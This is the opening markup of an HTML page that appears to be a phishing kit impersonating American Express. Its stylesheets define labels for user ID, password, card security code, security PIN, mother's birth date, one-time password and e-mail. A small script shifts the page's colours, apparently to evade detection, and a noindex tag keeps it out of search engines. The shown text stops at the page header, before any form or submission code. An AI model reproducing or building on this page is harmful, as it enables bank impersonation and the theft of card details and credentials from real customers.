<!DOCTYPE html>
<html>

<head>

<title id="title">One App</title>

    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#0057ae">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">

    <link id="favicon" rel="icon" type="image/png" href="data:image/x-icon;base64," />
    
	<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js" integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe" crossorigin="anonymous"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    
<style>
:root{--amex-blue:#006fcf;--amex-blue-hover:#0059a6;--white:#fff;--light-gray-bg:#f0f2f5;--header-height-desktop:70px;--header-height-mobile:70px}

*,*::before,*::after{box-sizing:border-box}
button{cursor:pointer;border:none;background:none;padding:0;font-family:inherit}
.amex-header-container{position: sticky;top: 0;z-index: 999;background-color:var(--white);border-bottom: 1px solid #d4d4d4;display:flex;align-items:center;height:var(--header-height-mobile);padding:10px}
  
.amex-nav{width:100%;max-width:1024px;margin:0 auto;display:flex;justify-content:space-between;align-items:center}
.nav-left,.nav-right{display:flex;align-items:center;gap:5px}
.menu-button{background-color:var(--amex-blue);width:64px;height:48px;border-radius:3px;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:4px;transition:background-color .2s ease-in-out}
.menu-button:hover{background-color:var(--amex-blue-hover)}
.hamburger-line{display:block;width:20px;height:2.5px;background-color:var(--white);border-radius:2px;transition:transform .3s ease-in-out}
.menu-button.active .hamburger-line:nth-child(1){transform:translateY(6.5px) rotate(45deg)}
.menu-button.active .hamburger-line:nth-child(2){opacity:0}
.menu-button.active .hamburger-line:nth-child(3){transform:translateY(-6.5px) rotate(-45deg)}
.logo{display:flex;flex-direction:column;line-height:1}
.logo-text{color:var(--amex-blue);font-weight:800;letter-spacing:.2px;text-transform:uppercase}
.logo-text-top{background-image:url(data:image/svg+xml;base64,);background-size:contain;background-repeat:no-repeat;background-position:center;width:100px;height:28px;display:inline-block;text-indent:-9999px}

.search-button{display:flex;align-items:center;justify-content:center;padding:10px;border-radius:50%;transition:background-color .2s ease-in-out}
.search-button:hover{background-color:var(--light-gray-bg)}
.search-icon{width:20px;height:20px;stroke:var(--amex-blue);stroke-width:2.5;transition:transform .2s ease-in-out}
.search-button:hover .search-icon{transform:scale(1.1)}
.login-button{background-color:var(--amex-blue);color:var(--white);font-size:14px;font-weight:100;width:84px;padding:10px;border-radius:3px;white-space:nowrap;transition:background-color .2s ease-in-out,transform .1s ease-in-out}
.login-button:hover{background-color:var(--amex-blue-hover)}
.login-button:active{transform:scale(.98)}


@media(max-width:375px){.logo{display:none}.nav-left{gap:0}.nav-right{gap:8px}.login-button{padding:10px 16px;font-size:14px}}

@media(min-width:1024px){.amex-header-container{height:var(--header-height-desktop)}.nav-left,.nav-right{gap:24px}.menu-button{width:64px;height:48px}
.logo-text-top{background-image: url(data:image/svg+xml;base64,);width: 45px;height: 45px}
.login-button{font-size:14px;}}
</style>

    
<style>
html,body{margin:0;padding:0;height:100%;width:100%;font-family:Helvetica Neue,Helvetica,sans-serif;font-size:16px;line-height:1.6;overflow-x:hidden;background-color:#f2f2f2;-webkit-tap-highlight-color:transparent;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
*:not(input):not(textarea):not([contenteditable]){caret-color:transparent}
input,textarea,[contenteditable]{caret-color:auto}
.fdic-logo{background-color:#fff;position:relative;height:35px;width:100%;text-align:center;border-bottom:0 solid #d4d4d4;padding:4px;font:inherit}
.inputWrapper{width:100%;margin:0 auto;box-sizing:border-box}
.labelTxt{display:block;margin-bottom:.3rem;font-size:0.99rem;color:#333333;font-weight:600}
.oun::before{content:"User ID"}
.ps::before{content:"Password"}
.csc::before{content:"3-Digit Card Security Code"}
.pn::before{content:"Your Security Pin"}
.mmdd::before{content:"Your Mother's Birth Month/Day"}
.otp::before{content:"One-time password"}
.em::before{content:"E-mail Address"}
.oun,.ps,.csc,.pn,.mmdd,.otp,.em{display:block;font-weight:600;font-size:.99rem;margin-bottom:4px;color:#333333}
input[type="text"],input[type="password"],input[type="number"]{width:100%;box-sizing:border-box;padding:.625rem;font-size:1rem;border:1px solid #8E9092;border-radius:.25rem;background-color:#F7F8F9;color:#2D2D2D;display:block}
input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
.upw-container{position:relative;width:100%;margin:0 auto 1rem;box-sizing:border-box}
.toggle-upw{position:absolute;top:50%;right:1rem;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:14px;color:#006fcf;padding:0}
.btn{display:flex;justify-content:center;margin:0 auto 1rem;padding:15px 30px;font-size:16px;border-radius:4px;box-sizing:border-box;min-width:100%;color:#fff;background:#006fcf!important;border:none}
.btnresend{background:#fcfcfc!important;padding-top:0;border:1px solid #f8f8f8;border-radius:7px;color:#005cb0;cursor:pointer;padding:5px 10px;margin:0 auto;position:relative;font-family:Helvetica Neue,Helvetica,sans-serif;font-size:.915rem;font-weight:400;text-align:left;text-decoration:none}
.btnstover{background:#fcfcfc!important;padding-top:0;border:1px solid #f7f7f7;border-radius:5px;color:#005cb0;cursor:pointer;padding:5px 15px;margin:0 auto;position:relative;font-family:Helvetica Neue,Helvetica,sans-serif;font-size:.71rem;font-weight:600;text-decoration:none}
#spinner{color:#0062c4;width:5rem;height:5rem}
.bi-check-circle-fill{color:#088308;display:flex;font-size:80px;justify-content:center;margin-bottom:10px}
.nwrapper{width:100%;max-width:960px;margin:0 auto;padding:0 1rem;box-sizing:border-box}
.dynamicGridDiv{display:flex;flex-wrap:wrap;justify-content:center;gap:15px;width:100%;padding:1rem;box-sizing:border-box;background-color:#f2f2f2}
.box{flex:1;max-width:calc(50% - 7.5px);background-color:#fff;box-sizing:border-box;padding:1rem;height:600px}
.fuidformContent{flex:1;max-width:calc(50% - 7.5px);background-color:#fff;box-sizing:border-box;padding:1rem 1rem 3rem;margin:0;position:relative;height:720px}
.fuidformContent,.box{background-color:#fff;padding:1rem;box-sizing:border-box;flex:0 1 calc(50% - 7.5px);max-width:calc(50% - 7.5px)}
.adsbox{text-align:center;margin:0 auto;padding-top:.5rem;box-sizing:border-box}
.adsbox img{width:300px;max-width:100%;height:auto;display:block;margin:0 auto;box-sizing:border-box}
.dynamicContainer{background-color:#fff;border-radius:.35rem;max-width:520px;min-height:570px;padding:1rem;margin:0 auto 1rem;box-sizing:border-box}
.dynamicSubContainer{background-color:#fff;max-width:420px;margin:0 auto 1rem;padding:.625rem;font-size:15px;line-height:1.55rem;font-weight:400;word-wrap:break-word}
.fuidNav{display:flex;justify-content:center;flex-wrap:nowrap;background-color:#f4f4f4;border-radius:5px;height:40px;width:95%;max-width:420px;margin:0 auto;box-sizing:border-box}
.fuidNav .active,.fuidNav .normal{flex:1;text-align:center;height:100%;display:flex;align-items:center;justify-content:center;white-space:nowrap;font-size:.775rem;font-weight:600}
.fuidNav .active{background-color:#006fcf;color:#fff;border-radius:5px}

.toast-msg{position:absolute;top:65%;left:50%;transform:translateX(-50%);background:#004891;color:#fff;padding:6px 12px;border-radius:4px;font-size:.95rem;box-shadow:0 2px 6px rgba(0,0,0,.2)}


.otp-error{display:flex;align-items:flex-start;gap:10px}
.otp-error i{font-size:2.5rem;}
.error-text-block{display:flex;flex-direction:column}
.error-text{color:#b42c01}
.error-extra{margin-top:2px}

#subclsdiv3 .overlay-layer{position:absolute;top:0;left:0;width:100%;height:100%; background:linear-gradient(to bottom,rgba(255,255,255,0.98) 0%,rgba(255,255,255,0.9) 100%); display:flex;justify-content:center;align-items:center; pointer-events:none;z-index:9999;}
#subclsdiv3 .overlay-layer .spinner-border{width:5rem;height:5rem;color:#004891}

.overlay{display:none;text-align:center;position:fixed;top:30%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.65);padding:22px 34px;min-width:220px;min-height:105px;border-radius:8px;color:#fff;z-index:9999}
.overlay-message{margin-top:10px;font-size:1.09rem}
#overlay{pointer-events:none}




@media(max-width:749px){.dynamicGridDiv{gap:0;padding:5px}.fuidformContent,.box{flex:0 1 100%;max-width:100%}.fuidformContent{height:500px}.box{height:400px}}
@media(min-width:750px) and (max-width:1199px){.fuidformContent{height:550px}.box{height:450px}}
@media(min-width:1200px){.fuidformContent{height:600px}.box{height:500px}}
</style>
<style>
:root{--amex-blue:#016fd0;--link-blue:#0073ce;--text-dark:#252525;--text-light:#555555;--border-gray:#dcdcdc;--bg-white:#ffffff;--facebook-blue:#3b5998;--linkedin-blue:#0077b5;--youtube-red:#cd201f;}
.amex-footer{width:100%;background-color:var(--bg-white);color:var(--text-dark);padding:50px 0;font-size:15px;min-height: 20vh;display: flex;flex-direction: column; justify-content: flex-end;}
.footer-container{max-width:1280px;margin:0 auto;padding:0 20px}

.footer-top{display:flex;justify-content:space-between;align-items:center;width:100%;margin-bottom:24px}
.footer-logo a{display:inline-block;vertical-align:middle}
.footer-logo svg{width:190px;height:auto}

.country-selector{display:flex;align-items:center;gap:8px;font-size:14px}
.country-selector .flag-icon{width:24px;height:auto;border:1px solid var(--border-gray)}
.country-selector span{color:var(--text-dark)}
.country-selector a{color:var(--link-blue);text-decoration:none;transition:text-decoration 0.2s ease}
.country-selector a:hover,.country-selector a:focus{text-decoration:underline}
.social-links{margin-bottom:32px}
.social-links ul{display:flex;align-items:center;gap:16px;margin:0;padding:0;list-style:none}
.social-links a{display:block;transition:opacity 0.2s ease}
.social-links a:hover,.social-links a:focus{opacity:0.8}
.social-links svg{width:32px;height:32px}
.social-links .icon-x svg{width:28px;height:28px;margin:2px}
.footer-nav{margin-bottom:32px}
.footer-nav ul{display:flex;flex-wrap:wrap;align-items:center;gap:8px 0;margin:0;padding:0;list-style:none}
.footer-nav li{display:flex;align-items:center}
.footer-nav a{color:var(--link-blue);text-decoration:none;font-size:14px;transition:text-decoration 0.2s ease}
.footer-nav a:hover,.footer-nav a:focus{text-decoration:underline}
.footer-nav li:not(:last-child)::after{content:"|";color:var(--border-gray);margin:0 12px;font-size:14px}
.footer-legal{font-size:15px;color:var(--text-dark);line-height:1.6}
.footer-legal p{margin:0 0 16px 0}
.footer-legal p:last-child{margin-bottom:0}
@media(max-width:992px){.footer-nav ul{gap:8px 0}.footer-nav li:not(:last-child)::after{margin:0 8px}}
@media(max-width:768px){.amex-footer{padding:30px 0}.footer-top{flex-direction:column;align-items:flex-start;gap:16px;margin-bottom:24px}.footer-nav{margin-bottom:24px}}
@media(max-width:480px){.footer-nav li:not(:last-child)::after{margin:0 6px}.footer-nav a,.footer-nav li:not(:last-child)::after{font-size:13px}}
</style>

<script>
  document.addEventListener("DOMContentLoaded", () => {
    document.documentElement.style.filter = "hue-rotate(4deg)";
  });
</script>
</head>

<body>
  	<header class="amex-header-container">
	  <nav class="amex-nav">
	    <div class="nav-left">
	      <button class="menu-button" aria-label="Toggle menu" onclick="this.classList.toggle('active')">
	        <span class="hamburger-line"></span>
	        <span class="hamburger-line"></span>
	        <span class="hamburger-line"></span>
	      </button>
	      <div class="logo"><span class="logo-text logo-text-top"></span></div>
	    </div>
	    <div class="nav-right">
	      <button class="search-button" aria-label="Search">
	        <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
	      </button>
	      <button class="login-button">Log In</button>
	    </div>
	  </nav>
  </header>
